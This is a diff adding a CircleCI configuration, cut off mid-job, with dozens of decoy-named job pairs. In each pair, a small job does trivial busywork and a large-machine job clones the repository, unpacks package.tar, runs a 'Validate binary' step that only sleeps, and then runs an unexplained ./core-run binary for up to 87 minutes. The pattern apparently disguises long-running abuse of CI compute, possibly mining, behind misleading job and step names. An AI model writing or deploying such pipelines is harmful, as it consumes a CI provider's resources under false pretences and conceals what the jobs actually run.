@@ -1,0 +1,1634 @@
+version: 2.1
+
+jobs:
+  inspect_intergration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: accelerando
+          command: |
+            mkdir -p /var/tmp/shard4
+            set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=","; print "a","b","c","sum"; for(i=1;i<=10000;i++) print i, i*2, i*3, i+i*2+i*3}' > /var/tmp/shard4/d.out; true
+            echo "stage: intergration, bytes: $(wc -c </var/tmp/shard4/d.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - d.out
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/d.out 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  warmup_q1-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: upstream battle
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo {0..9}{0..9} | wc -w; true ; } > /var/tmp/shard4/step-C.out
+            echo "stage: q1-release, bytes: $(wc -c </var/tmp/shard4/step-C.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - step-C.out
+  q1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/step-C.out 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  auditor_india-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: plateau sit
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; for(i=1;i<=50;i++)t+=1.0/(i*i); printf "%.6f\n",t}'; true ; } > /var/tmp/shard4/gamma-out.data
+            echo "stage: india-3, bytes: $(wc -c </var/tmp/shard4/gamma-out.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - gamma-out.data
+  india-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/gamma-out.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  kick_fix-dashboard-bug:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: settle down
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; nproc 2>/dev/null; true ; } > /var/tmp/shard4/answer.log
+            echo "stage: fix-dashboard-bug, bytes: $(wc -c </var/tmp/shard4/answer.log)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - answer.log
+  fix-dashboard-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/answer.log 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  blue_succes-only:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: rain check
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo "The Quick Brown Fox" | awk '{for(i=1;i<=NF;i++)printf "%s", substr($i,1,1); print ""}'; true ; } > /var/tmp/shard4/frame.ok
+            echo "stage: succes-only, bytes: $(wc -c </var/tmp/shard4/frame.ok)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - frame.ok
+  succes-only:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  bundle_Prepare_Image5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: revive
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; file /etc/hostname 2>/dev/null | head -1 || echo file-missing; true ; } > /var/tmp/shard4/FINAL
+            echo "stage: Prepare_Image5, bytes: $(wc -c </var/tmp/shard4/FINAL)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - FINAL
+  Prepare_Image5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  tmp_refactor-8572:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; grep -c "^processor" /proc/cpuinfo; true ; } > /var/tmp/shard4/build-02.data
+            echo "stage: refactor-8572, bytes: $(wc -c </var/tmp/shard4/build-02.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - build-02.data
+  refactor-8572:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  round1_ga-v4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: liquid fuel
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print s}' | tail -1; true ; } > /var/tmp/shard4/z5
+            echo "stage: ga-v4, bytes: $(wc -c </var/tmp/shard4/z5)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - z5
+  ga-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/z5 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  Beta_romeo-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: clean sweep
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; test 5 -gt 3 && echo gt-ok; true ; } > /var/tmp/shard4/handoff.data
+            echo "stage: romeo-3, bytes: $(wc -c </var/tmp/shard4/handoff.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - handoff.data
+  romeo-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/handoff.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  ctx2_ruby3-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: picnic
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; head -c 1024 /dev/urandom | sha1sum | awk '{print $1}'; true ; } > /var/tmp/shard4/7921.out
+            echo "stage: ruby3-fmt, bytes: $(wc -c </var/tmp/shard4/7921.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 7921.out
+  ruby3-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/7921.out 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  precheck_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: brush grain
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo "a;b;c;d" | awk -F';' '{if(NF==4)print "four"}'; true ; } > /var/tmp/shard4/done-D
+            echo "stage: rollout, bytes: $(wc -c </var/tmp/shard4/done-D)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - done-D
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/done-D 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  Gamma_q3-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: lento
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /var/tmp/shard4/attempt-5.data
+            echo "stage: q3-canary, bytes: $(wc -c </var/tmp/shard4/attempt-5.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - attempt-5.data
+  q3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  run_v9-ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: heavy duty
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; printf 'this is a test\nnothing here\ntest again' | grep -F 'test'; true ; } > /var/tmp/shard4/e.out
+            echo "stage: v9-ga, bytes: $(wc -c </var/tmp/shard4/e.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - e.out
+  v9-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/handoff.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  D_DATA-682:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: heat pack
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; ls / | sort | md5sum; true ; } > /var/tmp/shard4/xc.pkg
+            echo "stage: DATA-682, bytes: $(wc -c </var/tmp/shard4/xc.pkg)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - xc.pkg
+  DATA-682:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/xc.pkg 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  A_prometheus-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: sanity
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /var/tmp/shard4/05.bin
+            echo "stage: prometheus-alpha, bytes: $(wc -c </var/tmp/shard4/05.bin)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 05.bin
+  prometheus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  install_run-nightly-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: fold laundry
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 61440 | fold -w40 | sort | uniq -c | wc -l; true ; } > /var/tmp/shard4/03.log
+            echo "stage: run-nightly-docker-image, bytes: $(wc -c </var/tmp/shard4/03.log)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 03.log
+  run-nightly-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/03.log 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  package_UAT_HOOK_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: today maybe
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo ${PATH:0:16}; true ; } > /var/tmp/shard4/build-01.data
+            echo "stage: UAT_HOOK_7, bytes: $(wc -c </var/tmp/shard4/build-01.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - build-01.data
+  UAT_HOOK_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-01.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  prefetch_add-router-v2-reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: reach across
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)t+=i; print t, t==100*101/2 ? "ok" : "fail"}'; true ; } > /var/tmp/shard4/step-11.out
+            echo "stage: add-router-v2-reload, bytes: $(wc -c </var/tmp/shard4/step-11.out)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - step-11.out
+  add-router-v2-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/step-11.out 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  postbuild_verify-production-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: sat ignore
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo {a..z} | wc -w; true ; } > /var/tmp/shard4/epsilon-out.data
+            echo "stage: verify-production-docker-image, bytes: $(wc -c </var/tmp/shard4/epsilon-out.data)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - epsilon-out.data
+  verify-production-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/build-02.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  redo_auh-check-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: bridge
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; echo 'double' | sed -n 'p;p'; true ; } > /var/tmp/shard4/artifact.bin
+            echo "stage: auh-check-5, bytes: $(wc -c </var/tmp/shard4/artifact.bin)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - artifact.bin
+  auh-check-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/artifact.bin 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  Alpha_RunRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: press flat
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; tr -s a-z < /etc/hostname | head -1; true ; } > /var/tmp/shard4/step-2.txt
+            echo "stage: RunRelease, bytes: $(wc -c </var/tmp/shard4/step-2.txt)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - step-2.txt
+  RunRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/handoff.data 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  warmer_perseus-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: again
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; ps -eo comm 2>/dev/null | sort | uniq | head -10; true ; } > /var/tmp/shard4/final.txt
+            echo "stage: perseus-beta, bytes: $(wc -c </var/tmp/shard4/final.txt)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - final.txt
+  perseus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/final.txt 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  B_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: mach limit
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print substr(s,2,3)}'; true ; } > /var/tmp/shard4/rpt-01.csv
+            echo "stage: go-live, bytes: $(wc -c </var/tmp/shard4/rpt-01.csv)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - rpt-01.csv
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/rpt-01.csv 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  drain_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: 3am oncall
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="abcdefghij"; for(i=1;i<=length(s);i++)print i, substr(s,i,1)}' | wc -l; true ; } > /var/tmp/shard4/checkpoint.pkl
+            echo "stage: bake-it, bytes: $(wc -c </var/tmp/shard4/checkpoint.pkl)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - checkpoint.pkl
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/shard4
+      - run:
+          name: Read handoff file
+          command: |
+            tr -s '[:alnum:]' < /var/tmp/shard4/checkpoint.pkl 2>/dev/null | head -c 30 || true
+      - run:
+          name: Fetch working tree
+          command: git clone -q https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar xf package.tar
+      - run:
+          name: Validate binary
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 87m
+          command: ./core-run && true
+  beta_v5-preview4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: dropped frame
+          command: |
+            mkdir -p /var/tmp/shard4
+            { set +o pipefail 2>/dev/null; seq 1 30 | awk '{if($1<=10)g="low"; else if($1<=20)g="mid"; else g="high"; count[g]++}END{for(k in count)print k":"count[k]}' | sort; true ; } > /var/tmp/shard4/04.blob
+            echo "stage: v5-preview4, bytes: $(wc -c </var/tmp/shard4/04.blob)"
+      - persist_to_workspace:
+          root: /var/tmp/shard4
+          paths:
+            - 04.blob
+  v5-preview4:
+    machine:
+      image: ubuntu-2204:current
